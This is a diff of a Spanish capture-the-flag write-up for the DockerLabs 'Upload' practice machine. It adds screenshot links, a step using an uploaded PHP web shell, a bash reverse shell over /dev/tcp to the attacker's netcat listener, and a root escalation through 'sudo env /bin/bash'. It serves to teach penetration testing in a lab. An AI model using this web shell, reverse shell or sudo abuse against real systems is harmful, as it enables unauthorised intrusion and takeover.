@@ -59,7 +59,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 Si revisamos el directorio que nos ha econtrado llamado "uploads", podremos oberservar que ahi se encuntra alojado nuestro archivo test.php.
 
-![image]()
+![image](https://github.com/Crisstianpd/CTFs/blob/c7607027a54663a493ee8f98bae0e294bba35842/DockerLabs/Easy/Upload/imgs/upload-img2.png)
 
 Nos dirijimos directamente atraves de la URL a nuestro archivo php y hacemos un llamado al parametro que predefinimos anteriormente para que ejecute el comando "id" en la maquina.
 
@@ -67,8 +67,10 @@ Nos dirijimos directamente atraves de la URL a nuestro archivo php y hacemos un 
 http://172.17.0.2/uploads/test.php?cmd=id
 ```
 
-![image]()
+![image](https://github.com/Crisstianpd/CTFs/blob/c7607027a54663a493ee8f98bae0e294bba35842/DockerLabs/Easy/Upload/imgs/upload-img3.png)
 Al hacer esto podremos observar la respuesta del servidor ante el comando "id" por lo que el archivo funciona y el servidor interpreta de forma correcta las peticiones hechas atraves del archivo php. Sabiendo esto, podemos intentar entablar una revershell del servidor a nuestra maquina atacante. 
+
+## Explotacion
 
 Nos colocamos en escucha con netcat por el puerto 443.
 ```shell
@@ -78,6 +80,32 @@ Y hacemos la siguiente peticion cambiando el "&" por su expresion en URL, un %26
 ```shell
 http://172.17.0.2/uploads/test.php?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
 ```
+![image](https://github.com/Crisstianpd/CTFs/blob/c7607027a54663a493ee8f98bae0e294bba35842/DockerLabs/Easy/Upload/imgs/upload-img4.png)
+Y hemos logrado ganar acceso como el usuario www-data.
+
+## Escalada de privilegios
+
+Comenzamos ejecuntadno un "sudo -l" para ver si exiten algun comando que podamos ejecutar con altos privilegios.
+
+```shell
+sudo -l
+________________________
+...
+User www-data may run the following commands on 41e845320485:
+    (root) NOPASSWD: /usr/bin/env
+```
+Vemos que podemos ejecutar el comando "env" como usuario root. Por ende, ejecutamos una bash atraves del comando env con ayuda de un sudo.
+```shell
+sudo env /bin/bash
+```
+
 ![image]()
-Y hemos logrado ganar acceso al servidor.
+Y comprobamos finalmente atraves de un whoami he id que ya nos econtramos como usuario root.
+
+Y de esta forma hemos resuelto la maquina Upload de DockerLabs.
+
+
+
+
+
 
